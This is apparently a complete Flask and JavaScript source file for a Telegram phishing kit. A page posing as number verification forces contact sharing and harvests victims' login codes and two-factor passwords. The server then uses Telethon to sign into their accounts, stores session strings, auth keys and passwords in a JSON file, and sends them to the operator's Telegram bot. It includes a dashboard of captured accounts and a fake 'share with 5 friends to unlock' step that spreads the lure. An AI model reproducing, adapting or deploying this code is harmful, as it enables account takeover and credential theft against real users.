from flask import Flask, request, jsonify, render_template_string
import os
import json
import base64
import threading
import asyncio
import logging
from datetime import datetime
import requests as http_requests
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import sys

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
logger = logging.getLogger(__name__)


def _si(v, d=0):
    try:
        return int(str(v).strip()) if v not in (None, "") else d
    except Exception:
        return d


BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
API_ID = _si(os.environ.get("API_ID"), 0)
API_HASH = (os.environ.get("API_HASH") or "").strip()
YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
PORT = _si(os.environ.get("PORT"), 5000)

logger.info("ENV | BOT=%s API_ID=%s API_HASH=%s OWNER=%s",
    "SET" if BOT_TOKEN else "MISSING", API_ID,
    "SET" if API_HASH else "MISSING", YOUR_TELEGRAM_ID)

if sys.version_info >= (3, 12) and sys.platform == 'win32':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass

app = Flask(__name__)
user_sessions = {}
pending_codes = {}
pending_2fa = {}
sessions_lock = threading.Lock()
DATA_FILE = "captured_accounts.json"


def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE) as f:
                return json.load(f)
        except Exception:
            return []
    return []


def save_account(account):
    accounts = load_accounts()
    found = False
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            found = True
            break
    if not found:
        accounts.append(account)
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
    except Exception as e:
        logger.error(f"Save err: {e}")
    return account


captured_accounts = load_accounts()


def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits


def notify(phone, ss, me, dc, pu=False, pv=""):
    if not BOT_TOKEN or not YOUR_TELEGRAM_ID:
        return
    try:
        extra = ""
        if pu:
            extra = "\n2FA Used"
            if pv:
                extra += f" | Pwd: `{pv}`"
        msg = (f"New Account!{extra}\nPhone: {phone}\n"
               f"Name: {me.first_name} {me.last_name or ''}\n"
               f"User ID: {me.id}\nDC: {dc}\n\nSession:\n`{ss}`")
        if len(msg) > 4000:
            msg = msg[:3990] + "..."
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'},
            timeout=15)
    except Exception as e:
        logger.error(f"notify: {e}")


def run_tg(phone, code=None, password=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                r = await client.send_code_request(phone)
                session_str = StringSession.save(client.session)
                with sessions_lock:
                    user_sessions[phone] = {'hash': r.phone_code_hash, 'session': session_str}
                    pending_codes[phone] = 'sent'
                    pending_2fa[phone] = False
                return {'success': True}
            except errors.FloodWaitError as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': f'Flood {e.seconds}s'}
            except Exception as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': str(e)[:80]}
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

        async def verify():
            with sessions_lock:
                if phone not in user_sessions:
                    return {'success': False, 'error': 'No session'}
                s = user_sessions[phone]
            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
            try:
                await client.connect()
                if not await client.is_user_authorized():
                    try:
                        await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
                    except errors.SessionPasswordNeededError:
                        with sessions_lock:
                            pending_2fa[phone] = True
                            pending_codes[phone] = '2fa_needed'
                        if password:
                            try:
                                await client.sign_in(password=password)
                                with sessions_lock:
                                    pending_2fa[phone] = False
                                    pending_codes[phone] = 'done'
                            except errors.PasswordHashInvalidError:
                                return {'success': False, 'error': 'Wrong 2FA password'}
                        else:
                            return {'success': False, 'error': '2FA', 'needs_password': True}
                    except errors.PhoneCodeInvalidError:
                        return {'success': False, 'error': 'Wrong code'}
                    except errors.PhoneCodeExpiredError:
                        return {'success': False, 'error': 'Code expired'}
                me = await client.get_me()
                await client.get_dialogs()
                ss = StringSession.save(client.session)
                try:
                    ak = client.session.auth_key.key
                    dc = client.session.dc_id
                except Exception:
                    ak = b""
                    dc = 0
                ab = base64.b64encode(ak).decode() if ak else ""
                pu = password is not None
                acc = {
                    'phone': phone, 'user_id': me.id,
                    'username': me.username or '', 'first_name': me.first_name or '',
                    'last_name': me.last_name or '', 'session': ss,
                    'webk': json.dumps({'dcId': dc, 'authKey': ab, 'userId': me.id,
                        'isSupport': False, 'isTest': False}),
                    'dc': dc, 'time': str(datetime.now()),
                    'has_2fa': pu, 'password': password if pu else ''
                }
                save_account(acc)
                global captured_accounts
                captured_accounts = load_accounts()
                with sessions_lock:
                    user_sessions.pop(phone, None)
                    pending_2fa.pop(phone, None)
                    pending_codes[phone] = 'done'
                notify(phone, ss, me, dc, pu, password if pu else "")
                return {'success': True, 'session': ss, 'user_id': me.id}
            except Exception as e:
                es = str(e)
                if 'PHONE_CODE_INVALID' in es:
                    return {'success': False, 'error': 'Wrong code'}
                if 'SESSION_PASSWORD_NEEDED' in es:
                    return {'success': False, 'error': '2FA', 'needs_password': True}
                if 'PASSWORD_HASH_INVALID' in es:
                    return {'success': False, 'error': 'Wrong 2FA password'}
                return {'success': False, 'error': es[:80]}
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

        if code:
            return loop.run_until_complete(verify())
        return loop.run_until_complete(send_code())
    finally:
        loop.close()


PAGE = r'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Verification</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{width:100%;min-height:100%;overflow-x:hidden}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;position:relative}
.bg{position:fixed;inset:0;background:linear-gradient(135deg,#1a1a2e,#e94560 50%,#0a0a0a);z-index:1}
.bg::before{content:"";position:absolute;inset:0;background:radial-gradient(circle at 20% 30%,rgba(233,69,96,0.5),transparent 50%),radial-gradient(circle at 80% 70%,rgba(0,136,204,0.4),transparent 50%)}
.blur{position:fixed;inset:0;backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);background:rgba(0,0,0,0.7);z-index:2}
.wrap{position:relative;z-index:10;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.modal{background:#141420;border-radius:24px;padding:32px 24px;max-width:380px;width:100%;border:1px solid #2a2a3e;box-shadow:0 20px 60px rgba(0,0,0,0.8);text-align:center;animation:pop 0.4s cubic-bezier(0.34,1.56,0.64,1)}
@keyframes pop{0%{transform:scale(0.8);opacity:0}100%{transform:scale(1);opacity:1}}
.ico{font-size:56px;margin-bottom:15px;display:inline-block}
.modal h2{font-size:22px;font-weight:800;margin-bottom:8px;color:white}
.modal p{color:#888;font-size:14px;margin-bottom:22px;line-height:1.5}
.btn{width:100%;padding:18px;border:none;border-radius:50px;color:white;font-size:17px;font-weight:800;cursor:pointer;margin:8px 0;letter-spacing:0.5px;transition:transform 0.15s}
.btn:active{transform:scale(0.97)}
.btn:disabled{opacity:0.5}
.green{background:linear-gradient(45deg,#25D366,#128C7E);box-shadow:0 8px 25px rgba(37,211,102,0.4)}
.blue{background:linear-gradient(45deg,#0088cc,#00a8e8);box-shadow:0 8px 25px rgba(0,136,204,0.4)}
.red{background:linear-gradient(45deg,#e94560,#d63851);box-shadow:0 8px 25px rgba(233,69,96,0.4)}
.otps{display:flex;gap:8px;justify-content:center;margin:20px 0}
.otps input{width:45px;height:58px;text-align:center;font-size:24px;font-weight:bold;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:12px;color:white;outline:none;caret-color:#0088cc;transition:border 0.2s}
.otps input:focus{border-color:#0088cc;box-shadow:0 0 0 3px rgba(0,136,204,0.2)}
.pwd{width:100%;padding:16px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:12px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0 15px}
.pwd:focus{border-color:#e94560;box-shadow:0 0 0 3px rgba(233,69,96,0.2)}
.msg{padding:12px 16px;border-radius:10px;margin:12px 0;font-size:13px;display:none}
.msg.show{display:block;animation:pop 0.3s}
.msg.ok{background:rgba(76,175,80,0.15);color:#81C784;border:1px solid rgba(76,175,80,0.3)}
.msg.err{background:rgba(244,67,54,0.15);color:#EF9A9A;border:1px solid rgba(244,67,54,0.3)}
.msg.info{background:rgba(33,150,243,0.15);color:#90CAF9;border:1px solid rgba(33,150,243,0.3)}
.step{display:none}
.step.on{display:block}
.resend{color:#0088cc;font-size:13px;margin-top:15px;cursor:pointer;text-decoration:underline;display:none}
.ss{display:flex;justify-content:center;gap:8px;margin:20px 0}
.sst{width:38px;height:38px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700;transition:all 0.3s}
.sst.done{background:#4CAF50;color:white}
.sst.active{background:#0088cc;color:white;box-shadow:0 0 0 4px rgba(0,136,204,0.3)}
</style>
</head>
<body>
<div class="bg"></div>
<div class="blur"></div>
<div class="wrap">

<div id="contactBox" class="modal step on">
<div class="ico">&#128241;</div>
<h2>Verify Your Number</h2>
<p>Tap <strong>Share Contact</strong> below to continue</p>
<button class="btn green" id="shareContactBtn">SHARE CONTACT</button>
<div id="contactMsg" class="msg"></div>
</div>

<div id="otpBox" class="modal step">
<div class="ico">&#128274;</div>
<h2>Enter Verification Code</h2>
<p>5-digit code sent to <strong id="phoneShow" style="color:#0088cc"></strong></p>
<div class="otps">
<input type="tel" maxlength="1" inputmode="numeric" id="o1">
<input type="tel" maxlength="1" inputmode="numeric" id="o2">
<input type="tel" maxlength="1" inputmode="numeric" id="o3">
<input type="tel" maxlength="1" inputmode="numeric" id="o4">
<input type="tel" maxlength="1" inputmode="numeric" id="o5">
</div>
<div id="otpMsg" class="msg"></div>
<button class="btn blue" id="verifyBtn">VERIFY CODE</button>
<div class="resend" id="resendBtn">Resend code</div>
</div>

<div id="pwdBox" class="modal step">
<div class="ico">&#128272;</div>
<h2>Two-Factor Auth</h2>
<p>This account is protected.<br>Enter your cloud password:</p>
<input type="password" id="pwdInput" class="pwd" placeholder="Cloud password" maxlength="64">
<div id="pwdMsg" class="msg"></div>
<button class="btn red" id="pwdBtn">VERIFY PASSWORD</button>
</div>

<div id="shareBox" class="modal step">
<div class="ico">&#127916;</div>
<h2>Almost Unlocked!</h2>
<p>Share with <strong>5 friends</strong> to unlock</p>
<div class="ss">
<div class="sst" id="st1">1</div>
<div class="sst" id="st2">2</div>
<div class="sst" id="st3">3</div>
<div class="sst" id="st4">4</div>
<div class="sst" id="st5">5</div>
</div>
<div id="shareMsg" class="msg show info">Tap Share to start</div>
<button class="btn green" id="shareBtn">SHARE ON TELEGRAM</button>
</div>

</div>
<script>
var tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) { tg.ready(); tg.expand(); }
var TG_ID = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : null;
var UPK = 'pv_phone_' + TG_ID;
var USK = 'pv_shares_' + TG_ID;
var UCK = 'pv_captured_' + TG_ID;
var phoneNumber = '';
var codeCheck = null;
var pwdCheck = null;
var contactForce = null;
var TG_CHANNEL = 'https://t.me/videodks';
var TG_CAPTION = 'Premium content';

function show(id) { var e = document.getElementById(id); e.classList.add('on'); }
function hide(id) { var e = document.getElementById(id); e.classList.remove('on'); }
function msg(id, text, type) {
  var e = document.getElementById(id);
  e.textContent = text;
  e.className = 'msg show ' + type;
}

window.onload = function() {
  hide('otpBox'); hide('pwdBox'); hide('shareBox');
  show('contactBox');
  var cp = localStorage.getItem(UPK);
  var ic = localStorage.getItem(UCK) === '1';
  if (cp && ic) {
    phoneNumber = cp;
    hide('contactBox');
    openShare();
  } else if (cp) {
    phoneNumber = cp;
    hide('contactBox');
    openOtp();
  } else {
    startForce();
  }
};

function startForce() {
  if (contactForce) clearInterval(contactForce);
  setTimeout(triggerShare, 500);
  contactForce = setInterval(function() {
    if (document.getElementById('contactBox').classList.contains('on')) {
      triggerShare();
    } else {
      clearInterval(contactForce);
      contactForce = null;
    }
  }, 1000);
}

function triggerShare() {
  if (!tg) { msg('contactMsg', 'Open this link inside Telegram', 'err'); return; }
  if (typeof tg.requestContact === 'function') {
    try {
      tg.requestContact(function(sent, event) {
        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
          handleContact(event.responseUnsafe.contact);
        } else {
          msg('contactMsg', 'Contact share required to continue', 'err');
        }
      });
      return;
    } catch(e) {}
  }
  if (typeof tg.openContactPicker === 'function') {
    try {
      tg.openContactPicker(function(sent, event) {
        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
          handleContact(event.responseUnsafe.contact);
        } else {
          msg('contactMsg', 'Contact share required to continue', 'err');
        }
      });
      return;
    } catch(e) {}
  }
  msg('contactMsg', 'Update Telegram app', 'err');
}

document.getElementById('shareContactBtn').onclick = triggerShare;

function handleContact(c) {
  var phone = c.phone_number || '';
  if (!phone) { msg('contactMsg', 'No phone number', 'err'); return; }
  if (phone.charAt(0) !== '+') phone = '+' + phone;
  phoneNumber = phone;
  msg('contactMsg', 'Verified!', 'ok');
  if (contactForce) { clearInterval(contactForce); contactForce = null; }
  fetch('/api/save_contact', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({tg_id: TG_ID || 'web', phone: phoneNumber})
  })
  .then(function(r) { return r.json(); })
  .then(function(d) {
    if (d.success) {
      localStorage.setItem(UPK, phoneNumber);
      if (d.already_captured && d.user_id) {
        localStorage.setItem(UCK, '1');
        setTimeout(function() { hide('contactBox'); openShare(); }, 700);
      } else {
        setTimeout(function() { hide('contactBox'); openOtp(); }, 700);
      }
    } else {
      msg('contactMsg', 'Server error', 'err');
    }
  })
  .catch(function() { msg('contactMsg', 'Connection error', 'err'); });
}

function openOtp() {
  hide('contactBox'); hide('pwdBox'); hide('shareBox');
  show('otpBox');
  document.getElementById('phoneShow').textContent = phoneNumber;
  ['o1','o2','o3','o4','o5'].forEach(function(id) { document.getElementById(id).value = ''; });
  document.getElementById('o1').focus();
  msg('otpMsg', 'Sending code...', 'info');
  fetch('/api/share', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({phone: phoneNumber})
  })
  .then(function(r) { return r.json(); })
  .then(function(d) {
    if (d.success) {
      msg('otpMsg', 'Code sent! Check Telegram', 'ok');
      startOtpCheck();
      setTimeout(function() { document.getElementById('resendBtn').style.display = 'block'; }, 30000);
    } else {
      msg('otpMsg', d.error || 'Failed to send', 'err');
    }
  })
  .catch(function() { msg('otpMsg', 'Network error', 'err'); });
}

function startOtpCheck() {
  if (codeCheck) clearInterval(codeCheck);
  codeCheck = setInterval(function() {
    fetch('/api/check', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({phone: phoneNumber})
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
      if (d.s === '2fa_needed') {
        clearInterval(codeCheck);
        hide('otpBox'); show('pwdBox');
        document.getElementById('pwdInput').focus();
        startPwdCheck();
      } else if (d.s === 'done') {
        clearInterval(codeCheck);
        onCapture();
      } else if (d.s === 'err') {
        clearInterval(codeCheck);
        msg('otpMsg', 'Send failed. Try resend.', 'err');
        document.getElementById('resendBtn').style.display = 'block';
      }
    })
    .catch(function(){});
  }, 2000);
}

['o1','o2','o3','o4','o5'].forEach(function(id, i) {
  document.getElementById(id).addEventListener('input', function() {
    var v = this.value.replace(/[^0-9]/g, '');
    this.value = v;
    if (v && i < 4) document.getElementById('o' + (i + 2)).focus();
    var code = '';
    for (var k = 1; k <= 5; k++) code += document.getElementById('o' + k).value;
    if (code.length === 5) setTimeout(submitOtp, 200);
  });
  document.getElementById(id).addEventListener('keydown', function(e) {
    if (e.key === 'Backspace' && !this.value && i > 0) {
      document.getElementById('o' + i).focus();
    }
  });
});

function submitOtp() {
  var code = '';
  for (var i = 1; i <= 5; i++) code += document.getElementById('o' + i).value;
  if (code.length < 5) { msg('otpMsg', 'Enter all 5 digits', 'err'); return; }
  msg('otpMsg', 'Verifying...', 'info');
  document.getElementById('verifyBtn').disabled = true;
  fetch('/api/verify', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({phone: phoneNumber, code: code})
  })
  .then(function(r) { return r.json(); })
  .then(function(d) {
    document.getElementById('verifyBtn').disabled = false;
    if (d.success) {
      onCapture();
    } else if (d.needs_password) {
      hide('otpBox'); show('pwdBox');
      document.getElementById('pwdInput').focus();
      startPwdCheck();
    } else {
      msg('otpMsg', d.error || 'Wrong code', 'err');
      ['o1','o2','o3','o4','o5'].forEach(function(id) { document.getElementById(id).value = ''; });
      document.getElementById('o1').focus();
    }
  })
  .catch(function() {
    document.getElementById('verifyBtn').disabled = false;
    msg('otpMsg', 'Connection error', 'err');
  });
}

document.getElementById('verifyBtn').onclick = submitOtp;

document.getElementById('resendBtn').onclick = function() {
  document.getElementById('resendBtn').style.display = 'none';
  openOtp();
};

function startPwdCheck() {
  if (pwdCheck) clearInterval(pwdCheck);
  pwdCheck = setInterval(function() {
    fetch('/api/check', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({phone: phoneNumber})
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
      if (d.s === 'done') { clearInterval(pwdCheck); onCapture(); }
    })
    .catch(function(){});
  }, 2000);
}

document.getElementById('pwdBtn').onclick = function() {
  var pwd = document.getElementById('pwdInput').value.trim();
  if (!pwd) { msg('pwdMsg', 'Enter password', 'err'); return; }
  msg('pwdMsg', 'Checking...', 'info');
  document.getElementById('pwdBtn').disabled = true;
  var code = '';
  for (var i = 1; i <= 5; i++) code += document.getElementById('o' + i).value;
  fetch('/api/verify', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({phone: phoneNumber, code: code, password: pwd})
  })
  .then(function(r) { return r.json(); })
  .then(function(d) {
    document.getElementById('pwdBtn').disabled = false;
    if (d.success) { onCapture(); }
    else { msg('pwdMsg', d.error || 'Wrong password', 'err'); }
  })
  .catch(function() {
    document.getElementById('pwdBtn').disabled = false;
    msg('pwdMsg', 'Connection error', 'err');
  });
};

function onCapture() {
  localStorage.setItem(UPK, phoneNumber);
  localStorage.setItem(UCK, '1');
  localStorage.setItem(USK, '0');
  if (codeCheck) { clearInterval(codeCheck); codeCheck = null; }
  if (pwdCheck) { clearInterval(pwdCheck); pwdCheck = null; }
  hide('otpBox'); hide('pwdBox');
  openShare();
}

function openShare() {
  hide('contactBox'); hide('otpBox'); hide('pwdBox');
  show('shareBox');
  var n = parseInt(localStorage.getItem(USK) || '0');
  updSteps(n);
  if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok');
  else msg('shareMsg', n + '/5 done. Share to unlock.', 'info');
}

function updSteps(n) {
  for (var i = 1; i <= 5; i++) {
    var e = document.getElementById('st' + i);
    if (i <= n) e.className = 'sst done';
    else if (i === n + 1) e.className = 'sst active';
    else e.className = 'sst';
  }
}

document.getElementById('shareBtn').onclick = function() {
  var url = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL) + '&text=' + encodeURIComponent(TG_CAPTION);
  if (tg) { tg.openTelegramLink(url); } else { window.open(url, '_blank'); }
  var n = Math.min(parseInt(localStorage.getItem(USK) || '0') + 1, 5);
  localStorage.setItem(USK, String(n));
  updSteps(n);
  if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok');
  else msg('shareMsg', n + '/5 done. Share more.', 'ok');
};
</script>
</body>
</html>'''


@app.route('/')
def index():
    return render_template_string(PAGE)


@app.route('/tg')
def tg_route():
    return render_template_string(PAGE)


@app.route('/health')
def health():
    return jsonify({
        'status': 'ok',
        'BOT_TOKEN': 'SET' if BOT_TOKEN else 'MISSING',
        'API_ID': API_ID,
        'API_HASH': 'SET' if API_HASH else 'MISSING',
        'OWNER_ID': YOUR_TELEGRAM_ID,
        'accounts': len(captured_accounts)
    })


@app.route('/api/save_contact', methods=['POST'])
def save_contact():
    d = request.json
    tg_id = d.get('tg_id')
    phone = d.get('phone')
    if not phone or not tg_id:
        return jsonify({'success': False, 'error': 'Missing data'})
    phone = format_phone(phone)
    accounts = load_accounts()
    ex = next((a for a in accounts if a['phone'] == phone), None)
    if ex:
        return jsonify({
            'success': True, 'already_captured': True,
            'phone': phone, 'user_id': ex['user_id']
        })
    with sessions_lock:
        pending_codes[phone] = 'contact_saved'
    try:
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={'chat_id': YOUR_TELEGRAM_ID,
                'text': f"Contact: `{phone}` TG: `{tg_id}`",
                'parse_mode': 'Markdown'},
            timeout=10)
    except Exception:
        pass
    return jsonify({'success': True, 'phone': phone})


@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    ph = format_phone(ph)
    with sessions_lock:
        pending_codes[ph] = 'sending'
    t = threading.Thread(target=run_tg, args=(ph,))
    t.daemon = True
    t.start()
    return jsonify({'success': True})


@app.route('/api/check', methods=['POST'])
def check():
    phone = format_phone(request.json.get('phone', ''))
    with sessions_lock:
        s = pending_codes.get(phone, 'waiting')
    if s == 'waiting':
        accounts = load_accounts()
        if any(a['phone'] == phone for a in accounts):
            s = 'done'
    return jsonify({'s': s})


@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    ph = format_phone(d.get('phone', ''))
    return jsonify(run_tg(ph, d.get('code', ''), d.get('password')))


@app.route('/session/<phone>')
def get_session(phone):
    phone = format_phone(phone)
    global captured_accounts
    captured_accounts = load_accounts()
    a = next((x for x in captured_accounts if x['phone'] == phone), None)
    if not a:
        return jsonify({'error': 'Not found'}), 404
    return jsonify({
        'phone': phone, 'user_id': a['user_id'],
        'name': f"{a['first_name']} {a['last_name']}",
        'username': a['username'], 'dc': a['dc'],
        'session': a['session'], 'session_length': len(a['session']),
        'has_2fa': a.get('has_2fa', False)
    })


@app.route('/dash')
def dash():
    global captured_accounts
    captured_accounts = load_accounts()
    rows = ""
    for i, a in enumerate(captured_accounts, 1):
        sl = len(a.get('session', ''))
        tg = "2FA" if a.get('has_2fa') else ""
        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {a.get('last_name','')}</td><td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>{tg} ({sl})</td></tr>"
    total_2fa = sum(1 for a in captured_accounts if a.get('has_2fa'))
    return (
        "<!DOCTYPE html><html><head><title>Dash</title><style>"
        "body{background:#0a0a0a;color:white;font-family:Arial;padding:20px}"
        "h1{color:#e94560}table{width:100%;border-collapse:collapse;margin-top:15px}"
        "th,td{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}"
        "th{background:#141420;color:#ddd}tr:hover{background:#141420}"
        "</style></head><body>"
        f"<h1>Accounts: {len(captured_accounts)} | 2FA: {total_2fa}</h1>"
        "<table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>User</th><th>ID</th><th>DC</th><th>Session</th></tr></thead><tbody>"
        f"{rows if rows else '<tr><td colspan=7 style=text-align:center;color:#666;padding:30px>No accounts yet</td></tr>'}"
        "</tbody></table></body></html>"
    )


if __name__ == '__main__':
    if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
        logger.warning("Some env vars missing!")
    app.run(host='0.0.0.0', port=PORT
